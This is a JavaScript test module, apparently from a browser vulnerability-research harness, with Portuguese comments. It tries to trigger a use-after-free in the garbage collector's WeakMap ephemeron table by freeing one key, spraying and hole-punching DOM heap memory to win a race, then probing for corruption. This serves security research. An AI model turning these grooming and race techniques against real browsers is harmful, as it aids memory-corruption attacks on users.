import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'WEAKMAP_EPHEMERON_UAF',
    category: 'CoreJS',
    risk:     'HIGH',
    description:
        'Força o desync da tabela de Ephemerons do GC. ' +
        'O Groomer vai inundar a memória com dezenas de milhares de divs ' +
        'para atrasar o "Sweeping Phase" C++ após apagarmos a chave.',

    setup: function() {
        this.wm = new WeakMap();
        
        // Chave que vai MORRER
        this.deadKey = document.createElement('span');
        this.wm.set(this.deadKey, new ArrayBuffer(1024));
        
        // Chave que vai FICAR VIVA
        this.aliveKey = document.createElement('div');
        this.wm.set(this.aliveKey, [1.1, 2.2, 3.3]);

        // 🚨 Oráculo: Se a deadKey não morrer no C++, o ataque falhou.
        if (GCOracle.registry) GCOracle.registry.register(this.deadKey, `${this.id}_target`);
    },

    trigger: function() {
        // Libera a deadKey para acionar a limpeza da tabela do GC
        this.deadKey = null;

        // 🚨 O GATILHO DA CORRIDA (Race Condition):
        // Inundamos o bmalloc (DOM) e o forçamos a varrer a memória desesperadamente
        let nodes = Groomer.sprayDOM('div', 5000);
        Groomer.punchHoles(nodes, 2);
    },

    probe: [
        // A aliveKey nunca foi zerada! TEM que retornar true.
        // Se retornar false, a tabela do GC corrompeu e o UAF é letal.
        s => s.wm.has(s.aliveKey)
    ],

    cleanup: function() {
        this.wm = null;
        this.aliveKey = null;
        this.deadKey = null;
    }
};
